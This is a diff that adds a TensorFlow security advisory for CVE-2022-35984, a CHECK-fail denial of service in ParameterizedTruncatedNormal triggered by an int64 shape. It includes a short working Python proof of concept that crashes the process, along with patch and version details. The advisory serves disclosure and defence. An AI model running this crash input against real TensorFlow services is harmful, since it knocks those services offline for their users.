@@ -1,0 +1,22 @@
+<h2>TFSA-2022-115: <code>CHECK</code> fail in <code>ParameterizedTruncatedNormal</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-35984</p>
+<h3>Impact</h3>
+<p><code>ParameterizedTruncatedNormal</code> assumes <code>shape</code> is of type <code>int32</code>. A valid <code>shape</code> of type <code>int64</code> results in a mismatched type <code>CHECK</code> fail that can be used to trigger a denial of service attack.
+<code>python
+import tensorflow as tf
+seed = 1618
+seed2 = 0
+shape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)
+means = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
+stdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
+minvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
+maxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
+tf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">72180be03447a10810edca700cbc9af690dfeb51</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
